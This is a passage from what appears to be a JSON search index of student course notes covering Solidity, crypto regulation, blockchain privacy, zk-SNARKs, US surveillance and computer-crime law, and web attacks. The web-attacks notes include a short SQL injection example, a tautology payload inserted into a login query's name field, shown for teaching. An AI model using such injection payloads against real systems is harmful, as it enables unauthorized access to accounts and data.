\u0026quot;insufficient funds sent\u0026quot;) - required run conditions assert Should never fail in prod: this is just for dev code testing Function visibilities # external: function can only be called from outside contract Arguments read from calldata (costs 16 gas/byte) public: function can be called externally and internally If called externally: args copied from calldata to memory (expensive) private: only visible inside contract internal: only visible in this contract and contracts deriving from it view: only read storage (no writes) pure: does not touch storage Note: difference between tx.origin and msg.sender:\nImagine Tx chain A-\u0026gt;B-\u0026gt;C-\u0026gt;D, then at D msg.sender == C but tx.origin == A Notes on publicity of Solidity contracts # Despite compiling to EVM bytecode (only bytecode stored on-chain) - people want to see the source and verify the compiled contract is doing what it should be Therefore - Solidity code submitted to sites like Etherscan, which verify the compiled contract matches the on-chain bytecode Solidity variables stored in S[] array on chain This means that contracts cannot keep secrets!! "},{"id":138,"href":"/notes/cs251/2022-11-02-legal-aspects-and-regulation/","title":"Legal Aspects and Regulation","section":"CS 251, Fall 2022","content":" Cryptocurrency Law and Regulation # Guest lecture by Jake Chervinsky, The Blockchain Association\nBasics of regulations # Regulations: rules that either prohibit conduct or condition it on compliance with specific obligations; call for punishment of violators Purpose: control market power, facilitate competition, attract investment, protect consumers, achieve other government interests Regulation in the US # Creators and enforcers of regulation: Regulation on both state, federal level Legislature makes laws, executive enforces law, judiciary interprets laws Elected vs. appointed officials, policymakers vs. enforcers Codification: United States Code (USC) - actual laws/statutes passed by Congress Code of Federal Regulations (CFR) - regulations by executive agencies Plus guidance, settlements, no-action letters, etc. Unique system in all 50 states Regulators and Frameworks for Crypto Regulation # Securities laws # The Securities and Exchange Commission (SEC) Mission: protect investors, facilitate capital formation, maintain fair, orderly, efficient markets Federal securities laws originated in 1930s after Great Depression, seen as being caused by financial abuse and info. asymmetry SEC regulates \u0026ldquo;securities\u0026rdquo; and a broad range of securities market actors Crypto x Securities Securities: subject to regulatory requirements that may not work with crypto Registration with SEC, traded on SEC-regulated venues, held by SEC-approved custodians, etc. Crypto industry spends a lot of time and money avoiding SEC regulation as they perceive it as a \u0026ldquo;death blow\u0026rdquo; Investment contracts and the Howey test: SCOTUS defines investment contract as (SEC v. W.J. Howey Co, 1948) Investment of money Common enterprise Reasonable expectation of profit Based on efforts of others Regulation by enforcement: Jun. 2018: Bitcoin and Ether are \u0026ldquo;sufficiently decentralized\u0026rdquo; Apr. 2019: dozens of factors relevant to \u0026ldquo;based on efforts of others\u0026rdquo; Since then: efforts by chair Gary Gensler to classify digital assets as securities Commodities laws # Commodity Futures Trading Commission (\u0026ldquo;CFTC\u0026rdquo;) Mission: promote integrity, resilience, vibrancy of US derivatives markets: futures, options, swaps, etc. Created 1974 when most futures were traded in agriculture market Responsibilities greatly expanded after Great Recession + Dodd-Frank Act of 2010 CFTC-SEC turf war: are cryptocurrencies securities or commodities? General industry preference for CFTC due to friendlier positions, until Ooki DAO Anti-Money Laundering (AML) laws # Financial Crimes Enforcement Network (FinCEN): enforces Bank Secrecy Act (BSA) - US AML/countering terrorism financing (CFT) laws Requires regulated financial institutions to comply with certain AML program compliance requirements - incl. Know Your Customer (KYC) Includes centralized crypto institutions like exchanges and custodions Crypto x AML In general, BSA deputizes financial intermediaries to perform task of surveiling our transactions and reporting on them to government Sanctions laws # Office of Foreign Assets Control (OFAC) Sanctions: foreign policy tool used to influence behavior and diminish capabilities of foreign actors through economic penalties OFAC administers US sanctions by designated specific targets on Specially Designated Nationals (SDN) list, who are then cut off from US markets Illegal for any US-based person to transact w/ anyone on SDN list Crypto x Sanctions Sanctions compliance enforced on US-based crypto traders + exchanges Despite sometime difficulty of knowing who is on SDN list given \u0026ldquo;borderless\u0026rdquo; crypto; customers only identified by wallet addresses Bittrex: $24m settlement in 2022 for violations from 2014-2016 Virgil Griffith: 63 mos. imprisonment for aiding North Korea Policymakers think crypto is particularly useful for sanctions evasion Guest lecturer claims not particularly, with exceptions of NK Lazarus Group generating revenue from ransomware payouts and DeFi hacks, argument as follows: Came up after Russia invaded Ukraine, concerns about Russia using crypto to evade sanctions Crypto does not really allow Russia to get physical assets Use-case of crypto too limited for broad-scale sanctions evasion in Russia: Bitcoin/Ruble, Ether/Ruble market too weak Affects average citizens in sanctioned countries trying to get access to financial services, less so nation states My question: what about ransomware? # Guest lecturer response:\nRansomware existed before crypto, but crypto makes ransomware profitable Easier for ransomware actors to profit Need to get security house in order to prevent against attacks Before ransomware - bad security state; ransomware makes security state more apparent Argument: cannot use ransomware as an excuse for preventing average people from using crypto; \u0026ldquo;just clean up security\u0026rdquo; Ransomware has exposed how effective of Russia and other countries\u0026rsquo; (esp. NK) hacking operations, esp. state-sanctions NK: ransomware serious source of revenue Tax laws # Internal Revenue Service (IRS) IRS is responsible for collecting US federal taxes and administering US tax code, including how it applies to digital assets Unanswered questions about crypto taxes: Mining and staking? Hard forks and airdrops? DeFi transactions and interest income Infrastructure bill 2021: Infrastructure Investment and Jobs Act (IIJA) amendment with 5 new crypto provisions, incl. KYC Guest lecturer claims all are problematic Current issues and priorities # Privacy after TornadoCash mixer shutdown Mixer: can pool crypto access in a wallet, then withdraw funds to a new, fresh wallet address Allows users to obscure transaction flow Abused by bad actors e.g. Lazarus Group for money-laundering purposes Question: does OFAC have authority to make software illegal in the US? Stablecoins after Terra collapse Will centralized stablecoins get preferential treatments due to UST? DAOs after Ooki CFTC case: if governance token gets used to vote on protocol change, voter personally liable to CFTC case if commodities law violated Question: are DAO voters personally liable for operating DeFi protocols? DeFi after Lazarus Can DeFi stay permissionless despite concerns about illicit finance DCCPA, RFIA, DCA, etc. Will Congress grant CFTC juisdiction over crypto spot markets? Politics How will Congress composition change outlook for US crypto policy? "},{"id":139,"href":"/notes/cs251/2022-11-07-privacy-and-deanonymization-and-mixing/","title":"Privacy and Deanonymization and Mixing","section":"CS 251, Fall 2022","content":" Privacy, Deanonymization, and Mixing # The need for financial system privacy # Supply chain privacy: a manufacturer doesn\u0026rsquo;t want to reveal how much it pays its supplier for parts Payment privacy: company that pays its employees in crypto wants to keep list of employees and salaries private End users need privacy for rent, donations, purchases However: bare usage of blockchain results in thransactions being public to everyone!\nTypes of privacy # Pseudonymity (weak privacy) Every user has long term consistent pseudonym (e.g. Reddit) Pros: reputation Cons: link to real-world identity can leak over time Full anonymity: user\u0026rsquo;s transactions are unlinkable Cannot tell if two transactions are from the same address Privacy from who? # No privacy: everyone can see all transactions Privacy from the public: only trusted operator can see tranasactions (e.g. Visa, Mastercard) Semi-full privacy: only \u0026ldquo;local\u0026rdquo; law enforcement can see transactions Full privacy: no-one can see transactions (e.g. TornadoCash) Negative aspects: how to prevent criminal activity (supporting positive applications, but prevent the negative ones) and ensure legal compliance: De-anonymization strategies # Strategies for deanonymizing Bitcoin addresses\nHeuristic 1: 2 addresses input to a Tx: both addresses controlled by the same entity Heuristic 2: change address is controlled by the same user as input address Private coins on a public blockchain # Attempt 1: simple mixing Transaction inputs: users send Tx to mixer, mixer generates fresh addresses and sends Tx to intended recipients However: mixer knows the shuffle, and can abscond with the money Attepmt 2: mixing without a mixer CoinJoin (BTC) TornadoCash (ETH) "},{"id":140,"href":"/notes/cs251/2022-11-09-privacy-via-zk-snarks/","title":"Privacy via Zk Snarks","section":"CS 251, Fall 2022","content":" Using zk-SNARKs for Privacy on the Blockchain # What is a zk-SNARK? # SNARK: a succinct proof that a certain statement is true e.g. statement: \u0026ldquo;I know an m such that $SHA256(m) = 0$ Note: SNARK means that the proof is short and fast to verify (if m is 1GB then using the message m as a proof is not a SNARK) Blockchain applications: Private Tx on a public blockchain: Tornadocash, Zcash, Ironfish, Aleo Compliance: proving that private Tx are in compliance with banking laws; proving solvency in zero-knowledge Bridging between blockchains: zkBridge Review: arithmetic circuit # Fix finite field $\\mathrm{F} = {0, \u0026hellip;, p-1}$ for some prime $p \u0026gt; 2$ Arithmetic circuit $C : \\mathrm{F}^n \\rightarrow \\mathrm{F}$ Directed acyclic graph (DAG) where internal nodes labeled $+$, $-$, $\\times$ Inputs labeled $1, x_1, \\ldots, x_n$ Defines $n$-variate polynomial with an evaluation recipe $|C|$: number of inner gates in $C$ Interesting arithmetic circuits $C_\\text{hash}(h, m)$: outputs 0 if $SHA256(m) = h$, and nonzero otherwise $C_\\text{hash}(h, m) = (h - SHA256(m))$, $|C_\\text{hash}| \\approx $ 20k gates $C_\\text{sig}(pk, m, \\sigma)$: outputs 0 if $\\sigma$ is a valid ECDSA signature on $m$ with respect to $pk$, hundreds of thousands of gates NARK: Non-interactive ARgument of Knowledge # Public arithmetic circuit: $C(x, w) \\rightarrow F$ Where $x$ public statement in $F^n$, $w$ secret witness in $F^m$ Preprocessing (setup): $S(C) \\rightarrow$ public parameters $(pp, vp)$ for prover, verifier Prover: $P(pp, x, w) \\rightarrow $ proof $\\pi$ Verifier: $V(vp, x, \\pi) \\rightarrow $ accept or reject NARK requirements # Complete: if both $P$, $V$ honest, then $V$ should accept proof $\\pi$ Adaptively knowledge sound: $V$ accepts a proof: $P$ \u0026ldquo;knows\u0026rdquo; $w$ such that $C(x, w) = 0$ (an extractor $E$ can extract a valid $w$ from $P$) Optional: Zero knowledge: $(C, pp, vp, x, \\pi)$ \u0026ldquo;reveal nothing\u0026rdquo; about $w$ SNARK: a succinct NARK # Setup: similar, except\n$P(pp, w, x)$ generates a short proof $\\pi$ such that $|\\pi| = O_{\\lambda}(\\log(|C|))$ $V(vp, \\pi, x)$ is fast to verify such that $\\text{time}(V) = O_{\\lambda}(|x|, \\log(|C|))$ For zero-knowledge, defining knowledge soundness and zero-knowledge: see CS255 notes\nTypes of preprocessing setup # $r$ random bits Trusted setup per circuit: $S(C; r)$ random $r$ must be kept secret from prover Prover learns $r$: can provide false statements Therefore: destroy machine after using this once Trusted but universal (updatable) setup: secret $r$ is independent of $C$ Transparent setup: $S(C)$ does not use secret data (no trusted setup) Recent progress on proof systems # Groth (2016): proof size ~ 200 bytes, verifier time ~ 1.5ms, trusted per circuit setup Plonk and Marlin (2019): proof size ~ 400 bytes, verifier time ~ 3ms, universal trusted setup Bulletproofs (Bunz et al. (2017)): proof size ~ 1.5 kb (non-constant), verifier time ~ 3 sec, transparent setup STARK (Ben-Sasson et al. (2018)): proof size ~ 100 kb (non-constant), verifier time ~ 10 ms, transparent setup, post-quantum enabled And more! "},{"id":141,"href":"/notes/cs255/2022-01-03-intro/","title":"Intro","section":"CS 255, Winter 2022","content":" Intro # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":142,"href":"/notes/cs255/2022-01-05-stream-ciphers/","title":"Stream Ciphers","section":"CS 255, Winter 2022","content":" Stream ciphers # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":143,"href":"/notes/cs255/2022-01-10-block-ciphers/","title":"Block Ciphers","section":"CS 255, Winter 2022","content":" Block ciphers # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":144,"href":"/notes/cs255/2022-01-12-pseudorandom-functions/","title":"Pseudorandom Functions","section":"CS 255, Winter 2022","content":" Pseudorandom functions # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":145,"href":"/notes/cs255/2022-01-19-data-integrity-and-macs/","title":"Data Integrity and Macs","section":"CS 255, Winter 2022","content":" Data integrity and MACs # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":146,"href":"/notes/cs255/2022-01-24-collision-resistance/","title":"Collision Resistance","section":"CS 255, Winter 2022","content":" Collision resistance # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":147,"href":"/notes/cs255/2022-01-26-authenticated-encryption/","title":"Authenticated Encryption","section":"CS 255, Winter 2022","content":" Authenticated encryption # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":148,"href":"/notes/cs255/2022-01-31-key-management/","title":"Key Management","section":"CS 255, Winter 2022","content":" Key management # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":149,"href":"/notes/cs255/2022-02-02-key-exchange-math/","title":"Key Exchange Math","section":"CS 255, Winter 2022","content":" Key exchange math # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":150,"href":"/notes/cs255/2022-02-07-public-key-encryption/","title":"Public Key Encryption","section":"CS 255, Winter 2022","content":" Public key encryption # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":151,"href":"/notes/cs255/2022-02-09-pke-schemes/","title":"Pke Schemes","section":"CS 255, Winter 2022","content":" Pke schemes # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":152,"href":"/notes/cs255/2022-02-14-digital-signatures/","title":"Digital Signatures","section":"CS 255, Winter 2022","content":" Digital signatures # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":153,"href":"/notes/cs255/2022-02-16-certificates/","title":"Certificates","section":"CS 255, Winter 2022","content":" Certificates # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":154,"href":"/notes/cs255/2022-02-23-id-protocols/","title":"Id Protocols","section":"CS 255, Winter 2022","content":" Id protocols # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":155,"href":"/notes/cs255/2022-02-28-key-exchange-protocols/","title":"Key Exchange Protocols","section":"CS 255, Winter 2022","content":" Key exchange protocols # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":156,"href":"/notes/cs255/2022-03-02-zero-knowledge-protocols/","title":"Zero Knowledge Protocols","section":"CS 255, Winter 2022","content":" Zero knowledge protocols # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":157,"href":"/notes/cs255/2022-03-07-quantum-cryptography/","title":"Quantum Cryptography","section":"CS 255, Winter 2022","content":" Quantum cryptography # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":158,"href":"/notes/intlpol268/2021-09-20-intro/","title":"Intro","section":"INTLPOL 268, Fall 2021","content":" Class structure # Timing # Monday 11:30am-1:00pm: Tech lecture by Alex Wednesday 11:30am-1:30pm: Law lecture by Riana Friday 1:30pm-2:30pm: Lab section by Austin Grading # 25% - weekly legal short response (due 11:59pm Tuesday) 25% - weekly lab assignments (due 11:00am Monday) 50% - exams May be curves upward for reasonable distribution\nExams # Take-home exam: take between Oct 20 and Oct 24 4hr to complete what should be a 2hr exam Technical and legal topics Multiple-choice, short-ansewr, practical challenges from labs Open note and open reading Final exam - in person at time TBA Technical and legal topics - biased towards post-midterm topics Multiple-choice, short-ansewr, practical challenges from labs Open note and open reading Offensive security # \u0026ldquo;Hacking\u0026rdquo;: Manipulating a system of hardware and software to do something unintended by the designer or owner of that system Motivations for hacking: Revolutions like Arab Spring, to overthrow authoritarian governments Authoritarian governments formed after Arab Spring, for societal control Nation-states, to destabilize and compete with other countries Individuals and organizations, either for financial (i.e., ransomware) or ideological reasons To practice # Online training apps: Hack Yourself First; OWASP hacking lab Bug Bounty Programs CTFs, CPTC "},{"id":159,"href":"/notes/intlpol268/2021-09-22-legal-intro-and-electronic-communications-privacy-act/","title":"Legal Intro and Electronic Communications Privacy Act","section":"INTLPOL 268, Fall 2021","content":" Legal intro # Course assignments: Short responses # Assigned Wednesday lecture; due 11:59pm following Tuesday Max 400 words Discussion with other students allowed but need to submit alone Grading: \u0026ldquo;needs improvement,\u0026rdquo; \u0026ldquo;meets expectations,\u0026rdquo; \u0026ldquo;exceeds expectation\u0026rdquo; Cyber issue forces at play # Pathetic Dot theory: Market, Law, Norms, Architecture\nIndustry standards, compliance bodies, self-regulatory schemes\nISO27001 - infosec management standards; can become legal req by law or contract PCI DSS - anti CC fraud Digital Advertising Alliance - ad industry self-reg body Tech companies enforcing standards + policing behavior\nApple, google app stores - rules and review processes; keep out malware/spyware Cloudflare - stopped providing DDoS protection for hate speech Insurance\nCyber risk insurance - induce improvements in cybersec Forces are entwined with the law but not separate Legal regulations for insurance, app store antitrust issues Laws still necessary because self-regulation is lax Electronic Communications Privacy Act of 1986 (ECPA) # 4th amendment # Government cannot engage in unreasonable search and seizures\nSCOTUS: 4A protects conversations from warrantless surveillance In-person conversations: Berger v. New York, 388 U.S. 41 (1967) Phone calls: Katz v. United States, 389 U.S. 347 (1967) 4A does not protect phone numbers held by third parties Smith v. Maryland, 442 U.S. 735 (1979) - police can record outgoing numbers dialed from a phone 4A doesn\u0026rsquo;t protect info disclosed to third parties (business records) United States v. Miller, 425 U.S. 435 (1976) - seizing bank records with grand jury subpoenas is constitutional Congress\u0026rsquo;s response # Original federal Wiretap Act (1968) passed after Berger and Katz In 1986, Congress passed ECPA Amended Wiretap Act to include transmission of electronic data via computers Added Stored Communications Act Added Pen Register Statute - applies to transactional info about wire, electronic communications ECPA definitions # Electronic communication: email, text, non-voice internet transmissions, faxes, but not beepers, tracking devices, pr EFT info (electronic monetary transfer between financial accounts) How does this apply to VoIP or Zoom calls? Unclear! Contents: \u0026ldquo;substance, purport, or meaning\u0026rdquo; of the communication ex. subject line + body of an email (or contents of a snail-mail letter) Non-content information: information about the communication Metadata Email header, web request header, etc Note: in the context of the internet, this distinction is unclear ECPA and Wiretap Act # Prohibit interception of contents of wire/oral/electronic communications except as authorized However - Not unlawful if you\u0026rsquo;re \u0026ldquo;a party to the communications\u0026rdquo; or \u0026ldquo;one party has given prior consent to interception\u0026rdquo; One-party vs all-party consent: Wiretap Act - one party; whereas California, Massachusetts, etc - all-party If interception isn\u0026rsquo;t a federal violation, it might still be a state violation Wiretap orders to law enforcement aka \u0026ldquo;super warrant\u0026rdquo; or \u0026ldquo;Title III orders\u0026rdquo; Limited suppression remedy if evidence is gathered in violation of the law Evidence must be thrown out in court Only applies to oral and wire communications but not electronic text communications Pen Register Statute # Prohibits interception of non-content parts of electronic communications except as authorized Govt\u0026rsquo;s application must certify that info \u0026ldquo;likely to be obtained\u0026rdquo; is relevant to \u0026ldquo;ongoing criminal investigation being conducted by that agency\u0026rdquo; Court must issue the order if it finds the gov\u0026rsquo;t has certified this to the court Regulates real-time collection of communication\u0026rsquo;s non-content info Dialing, routing, addressing, and signaling (D/R/A/S) info this gets a communication from point A to point B - incoming/outgoing phone numbers, email to/from addresses, IP addresses URL can be DRAS or DRAS and content (i.e., search query in URL string) Govt can only collect DRAS info and not contents Technical assistance provisions Stored communications act # Regulates access to, and disclosure (both voluntary and compelled) of, stored communications, records, and subscriber info held by third-party service providers (ISPs, email, social media, cloud, etc) \u0026ldquo;Electronic communications service\u0026rdquo; (ECS) vs \u0026ldquo;remote computing service\u0026rdquo; (RCS) providers: ECS: \u0026ldquo;any service which provides to users thereof the ability to send and receive wire or electronic communications\u0026rdquo; RCS: \u0026ldquo;the provision to the public of computer storage or processing services by means of an electronic communications system\u0026rdquo; Different rules apply depending on whether ECS or RCS Written before modern internet; courts recognize that nowadays, most modern tech platforms act as both Theofel vs. Farey-Jones, 359 F.3D 1066 (9th Cir, 2004) effectively collapsed ECS/RCS destinction Courts still examine which feature of service is at issue (what \u0026ldquo;hat\u0026rdquo; is the provider wearing) "},{"id":160,"href":"/notes/intlpol268/2021-09-27-web-requests-and-attacks/","title":"Web Requests and Attacks","section":"INTLPOL 268, Fall 2021","content":" Web requests # GET requests # Useful for simple requests: retrieving a resource for a server; example: search\nGET\u0026rsquo;s are idempotent: same request is the same every time; should not change server state GET fields are limited to the URI Single Sign On # Allows user to log into multiple websites with only one login system\nAdvantages:\nSingle security implementation; only one login account needs to be maintained Single point of failure Allows security team at SSO provider to shut down suspicious login requests on other sites Can force 2FA on multiple sites if SSO provider enforces it POST requests # For changing server state; contains URI but also can have much more fields that are not contained in the URI\nCookies # Contained in browser sessions; information to remember user identity and can be used for later authentication\nWho can see a cookie?\nSame-origin policy: tries (but fails) to prevent websites from messing with each other Web Attacks # Asking the app to do what you want # Insert proxy between server and client; change fields in request Only works when field validation is client-side Using the web app to get code running in someone else\u0026rsquo;s browser # Cross-site scripting (XSS)\nInject script into server via web request Server saves script in database (stored XSS) Server serves script to another user when database request is made User\u0026rsquo;s browser does not know not to trust malicious payload and executes it Injecting commands to be run directly by the web app # SQL injection\nAttacker inserts malicious SQL into form field When SQL is performed on the form field, the entry confuses server into running it Example:\nSELECT * from Users where name=\u0026#39;\u0026#39;or 1=1;\u0026#39; and password=\u0026#39;pass1234\u0026#39;; "},{"id":161,"href":"/notes/intlpol268/2021-09-29-ecpa-for-private-actors/","title":"Ecpa for Private Actors","section":"INTLPOL 268, Fall 2021","content":" ECPA Continued # ECPA liability for private actors # Does WiFi \u0026ldquo;sniffing\u0026rdquo; violate the Wiretap Act? Statute: Not unlawful to intercept an electronic communication when readily accessible to general public This is to prevent penalizing radio hobbyists for listening in on radio frequencies Court: No! In re Innovatio IP Ventures, LLC Patent Litig., 886 F. Supp. 2d 888 (N.D. III 2012) Innovatio, a patent troll, used a \u0026ldquo;packet capture adapter\u0026rdquo; intercepted packets sent over WiFi to fish for IP violations on public WiFi networks Capture included content, not just metadata Court ruled this is not unlawful since it falls inside private interception exception Opinion held that sniffing public unencrypted WiFi comms is easy and cheap, so these comms are \u0026ldquo;readily accessible to the general public\u0026rdquo; Court: Maybe! Joffe v. Google Inc., 746 F.3d 920 (9th Cir. 2013) Google Street View cars mapping out available WiFi networks also obtained payload data Court held that payload data transmitted over Wi-Fi is not a \u0026ldquo;radio communication\u0026rdquo;: defined a distinction between \u0026ldquo;radio\u0026rdquo; and \u0026ldquo;radio EM spectrum\u0026rdquo; Court deleted original opinion\u0026rsquo;s \u0026ldquo;readily accessible\u0026rdquo; analysis Does setting third-party cookies violate the Wiretap Act? Court: No! In re Google Inc. Cookie Placement Consumer Privacy Litigation., 806 F.3d 125 (3d Cir. 2015) Plaintiffs alleged that Google et al. placed tracking cookies on web browsers against browser cookie blocking settings Cookies set through invisible iframes However: court ruled in Google\u0026rsquo;s favor Court: Yes! In re Facebook, Inc. Internet Tracking Litigation 956 F.3d 589 (9th Cir. 2020) Court acknowledged disagreement with Google Cookie in Facebook tracking case Other laws about cookies and consent # Europe: GDPRA, ePrivacy Directive California: CCPA, CA Privacy Rights Act (CPRA) Other states: VA Consumer Data Protection Act, WA Privacy Act "},{"id":162,"href":"/notes/intlpol268/2021-10-04-cyberattacks/","title":"Cyberattacks","section":"INTLPOL 268, Fall 2021","content":" Anatomy of a Cyberattack # Classifying cyber actors # What can they do? (skill) Who are they? (attribution) Why? (goals) Money Political motivations Anarchy Leads to the question of: How can we deter them?\nTypes of state cyber actors # Superpowers: Five Eyes (US, UK, AU, CA, NZ); CH (Mandiant APT 1, APT 17); RU (Mandiant APT 28, APT 29); IL; FR, DE, NL (?) Large, well-funded professional organizations Full-spectrum operations including HUMINT Advanced, self-driving malware with 0-days Careful operational security (ability to not get caught) Rapid Risers: IR, KP, VE, SK Rapidly improving via investment and foreign help Often using cyber to level playing field Might have 0-day, often new malware Learn quickly from the superpowers The Peleton (IN, PK, SA, BR, TR) Cyber capabilities seen as part of national power Skilled, but perhaps smaller, teams Often dependent on private groups, superpowres Poised to break out with right investment Ambitious buyers (MX, ET, AE) Purchasing both software and often operations Limited in-house development Likely to use cyber power domestically Nation-state control # Most control: US, UK Offensive operations under direct control with legal guidelines Non-authorized hacking prosecuted More control: IN, SK Pro-government operations carriedout by independent group with tight controls Mixture: CH, TR, IL Mixture of first and third-party operations Independent groups allowed to operate but tightly controlled Less control: RU, VE Mixture of first and third-party operations Independent groups encouraged to go rogue, internal politics can be dangerous Lawless: NG, RO Hackers operate for pure profit motive, government cannot/will not intervene Cyber Kill Chain # Reconnaissance: Planning phase of operation; research on targets Weaponization: Preparation and staging phase of operation; automated generation of malware; weaponizer couples malware and exploit into a deliverable payload Delivery: Adversaries convey malware to the target Exploitation: Adversaries must exploit vulnerability to gain access (0-days) Installation: Adversaries install persistent backdoor in victim environment to maintain extended access Command and Control (C2): Malware opens a command channel to enable adversary to remotely manipulate the victim With hands-on keyboard access, intruders accomplish the mission\u0026rsquo;s goal Social engineering is much simpler: can accomplish goals (information theft) with only first 4 steps; phishing payload is easy to create.\n"},{"id":163,"href":"/notes/intlpol268/2021-10-06-computer-fraud-and-abuse-act/","title":"Computer Fraud and Abuse Act","section":"INTLPOL 268, Fall 2021","content":" Computer Fraud and Abuse Act (CFAA) # TW: Suicide\nKey concepts # \u0026ldquo;Access without authorization\u0026rdquo; Not defined in the statute \u0026ldquo;Exceeding authorized access\u0026rdquo; Defined in the statute yet courts still are inconsistent about interpretting it Recently interpreted by the Supreme Court in Van Buren v. United States Subsections: # a - Seven or more prohibitions (a)(1) Espionage prohibitions (a)(2) Obtaining information from 3 sources: financial/banking/credit institutions, federal govt, or \u0026ldquo;any protected computer\u0026rdquo; (a)(3) Trespass on federal government system (a)(4) Intent to defraud (a)(5) Causes damage (A) knowingly causes transmission of program that intentionally causes damage without authorization to a protected computer (B) intentionally accesses a protected compute rwithout authorization, and as a result of such conduct, recklessly causes damage (C) intentionally accesses a protected computer without authorization, and as a result of such conduct, causes damage and loss (a)(6) Password trafficking (a)(7) Extortion threats to a computer/data Renewed relevance in the age of ransomware b - Attempt and conspiracy c - Sentences for criminal violations d - Secret service power to investigate e - Definitions \u0026ldquo;damage\u0026rdquo;: any impairment to the integrity or availability of a data, a program, a system, or information \u0026ldquo;loss\u0026rdquo;: any reasonable cost to any victim: includes cost of incident response, damage assessment, data/program/system/information restoration, revenue lost, cost incurred, other consequential damages incurred because of interruption of service \u0026ldquo;protected computer*: (e)(2)(A) Financial or federal government computer (e)(2)(B) \u0026ldquo;used in or affecting interstate or foreign commerce or communication\u0026rdquo; -\u0026gt; any internet-connected computer (e)(2)(C), added 2020: \u0026ldquo;is part of a voting system\u0026rdquo;, either is used for federal election management/support/administration or \u0026ldquo;has moved in or otherwise affects interstate or foreign commerce\u0026rdquo; f - Law enforcementand intelligence agencies exception g - Civil cause of action, negligence exemption h - Reporting to Congress (now expired) i - Forfeiture provisions j - Forfeiture provisions Criminal cases under CFAA # Morris Worm (1988) # One of the first computer worms spread via Internet At least $100,000 in damage ($225,000 in 2021 dollars) Infected ~3-10% of all Internet-connect computers at the time First felony conviction under CFAA (upheld by Second Circuit, 1991) Convicted under then-current version of 1030(a)(5) which was subsequently amended in 1996 Indictments of state-sponsored hackers and look-alikes # China: Dec. 2018 indictment of members of APT-10 for conspiracy to violate 7 sections/subsections of CFAA Iran: Mar. 2018 indictment of Iranian \u0026ldquo;Hackers for hire\u0026rdquo; who hacked 144 U.S. universities at behest of Iranian govt, conspiracy to violate 5 sections/subsections of CFAA Andrei Tyruin: Russian who hacked banks and financial institutions such as JPMorgan (original CFAA offense) Pleaded guilty in fall of 2019, sentenced to 12 years in prison in 2021 Turned out to be plain old organized crime, but hacks\u0026rsquo; scope and sophistication = originally suspected as state-sponsored attack United States v. Lori Drew (C.D. Cal. 2009) # Mother created a fake myspace account to cyberbully a girl she thought was spreading gossip about her daughter; daughter took her own life This constituted terms of service violation of MySpace Lower court held that terms of service violation is \u0026ldquo;unauthorized access\u0026rdquo; Judge overturned conviction United States v. Nosal I (9th Cir. 2012) # Group of employees log into company computer and take info from confidential database for use by a competing business 9th Cir. ruled that this did not exceed authorized access Violating a website\u0026rsquo;s TOS can\u0026rsquo;t be the basis for criminal liability under the CFAA; otherwise, could criminalize many daily activities United States v. Nosal II (9th Cir. 2016) # This time, govt tried to prosecute on access \u0026ldquo;without authorization\u0026rdquo; Former employee\u0026rsquo;s login gets revoked; other emloyees who left logged in using credentials of current employee 9th Cir. ruled that access was \u0026ldquo;without authorization\u0026rdquo; After affirmative revocation of authorization; no \u0026ldquo;going through the back door and accessing the computer through 3rd party\u0026rdquo; Note: prosecutors stacked other (non-CFAA) charges and jury convicted on all counts Companies really like punishing departing employees that try to compete Can sue departing employee civilly, even if prosecutors refuse to charge TOS, employment agreements, etc exist to protect provider or employer, not user or employee Civil cases under the CFAA # Web scraping Cvent v. EventBrite (EDVA 2010) hiQ v. LinkedIn (9th cir. 2019) (vacated) ToS violations Cvent v. EventBrite (EDVA 2010) hiQ v. LinkedIn (9th cir. 2019) (vacated) Changing/masking IP address Craigslist v. 3Taps (NDCA 2013) Facebook v. Power Ventures (9th Cir. 2016) Ignoring cease and desist letter Craigslist v. 3Taps (NDCA 2013) Facebook v. Power Ventures (9th Cir. 2016) hiQ v. LinkedIn (9th cir. 2019) (vacated) Facebook v. Power Ventures (9th Cir. 2016) # Issued one week after Nosal II: Orin Kerr called it an \u0026ldquo;outlier\u0026rdquo; What does \u0026ldquo;without authorization\u0026rdquo; mean? FB users\u0026rsquo; consent to give Power Ventures access to their info on FB doesn\u0026rsquo;t make it OK Per Nosal I, violating TOS is not violating CFAA Merely bypassing IP block is not unauthorized use May not know authorization was revoked Does violate CFAA to keep accessing servers without permission after getting a C\u0026amp;D letter hiQ Labs v. LinkedIn (9th Cir. 2019) (vacated and remanded by SCOTUS in 2021) # Scraping publicly-available data isn\u0026rsquo;t a CFAA violation Even if system owner sends a C\u0026amp;D letter! What\u0026rsquo;s \u0026ldquo;without authorization\u0026rdquo;? Power Ventures: sending a C\u0026amp;D letter revokes authorization LinkedIn sent hiQ a C\u0026amp;D; yet court says no CFAA violation Limiting Power Ventures: Data viewable only when logged-in (CFAA violation) vs. data publicly displayed to everyone (not a CFAA violation) CFAA violation would Van Buren v. United States (2021) # Police officer accessed database for private purposes; state prosecuted Case interprets \u0026ldquo;exceeds authorization\u0026rdquo; clause Justice Barrett\u0026rsquo;s majority opinion agrees that \u0026ldquo;without authorization\u0026rdquo;:outside hackers; \u0026ldquo;exceeds authorized access\u0026rdquo;:\u0026ldquo;inside hackers\u0026rdquo; \u0026ldquo;Exceeds authorized access\u0026rdquo; means \u0026ldquo;obtain[ing] information from particular areas in the computer \u0026ndash; such as files, folders, or databases \u0026ndash; to which [your] computer access does not extend.\u0026rdquo; Agrees with Nosal I\u0026rsquo;s access vs. use distinction Holds that TOS violations do not violate the CFAA Court is wary of \u0026ldquo;the drafting practices of private parties,\u0026rdquo; who write computer use policies and TOS, control what access is a federal crime 